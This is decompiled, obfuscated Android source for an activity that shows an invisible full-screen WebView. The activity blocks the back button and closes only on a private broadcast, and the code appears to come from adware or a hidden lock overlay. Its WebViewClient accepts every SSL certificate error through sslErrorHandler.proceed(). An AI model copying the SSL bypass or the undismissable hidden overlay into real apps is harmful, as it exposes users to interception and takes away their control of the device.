package com.sonnokta;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.http.SslError;
import android.os.Bundle;
import android.view.View;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import com.sonnokta.utils.LogUtil;

import fddo.Cgoto;

public class p049p extends Activity {
    private static String TAG = "bwolf-p049p";

    class fddo extends WebViewClient {

        /* renamed from: fddo  reason: collision with root package name */
        public boolean f99fddo = true;

        fddo() {
        }

        public void onPageFinished(WebView webView, String str) {
            super.onPageFinished(webView, str);
            if (this.f99fddo) {
                webView.setVisibility(View.VISIBLE);
            }
        }

        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            sslErrorHandler.proceed();
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    class ifdf extends BroadcastReceiver {
        ifdf() {
        }

        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action.equals(context.getPackageName() + ".L_CLOSE")) {
                p049p.this.finish();
            }
        }
    }

    public RelativeLayout fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        Context applicationContext = getApplicationContext();
        RelativeLayout relativeLayout = new RelativeLayout(applicationContext);
        WebView webView = new WebView(this);
        webView.setLayoutParams(new RelativeLayout.LayoutParams(-1, -1));
        relativeLayout.addView(webView);
        webView.setVisibility(View.INVISIBLE);
        webView.setVerticalScrollBarEnabled(true);
        try {
            webView.setWebViewClient(new fddo());
            webView.loadDataWithBaseURL("", "<html><body bgcolor='#000'></body></html>", "text/html", "UTF-8", "");
            webView.setVisibility(View.INVISIBLE);
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, "EXC_LOCK_ACT_SHOWLOCK", e);
            finish();
        }
        return relativeLayout;
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onActivityResult ---");
        super.onActivityResult(i, i2, intent);
        finish();
    }

    public void onBackPressed() {
        LogUtil.showErrorLog(TAG, "--- onBackPressed ---");
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        LogUtil.showErrorLog(TAG, "--- onCreate ---");
        Context applicationContext = getApplicationContext();
        try {
            ifdf ifdf2 = new ifdf();
            registerReceiver(ifdf2, new IntentFilter(applicationContext.getPackageName() + ".L_CLOSE"));
            RelativeLayout fddo2 = fddo();
            if (fddo2 != null) {
                setContentView(fddo2);
                setFinishOnTouchOutside(false);
                getWindow().setLayout(-1, -1);
            }
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, "EXC_LOCK_ACT", e);
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        super.onPause();
        LogUtil.showErrorLog(TAG, "--- onPause ---");
    }
}
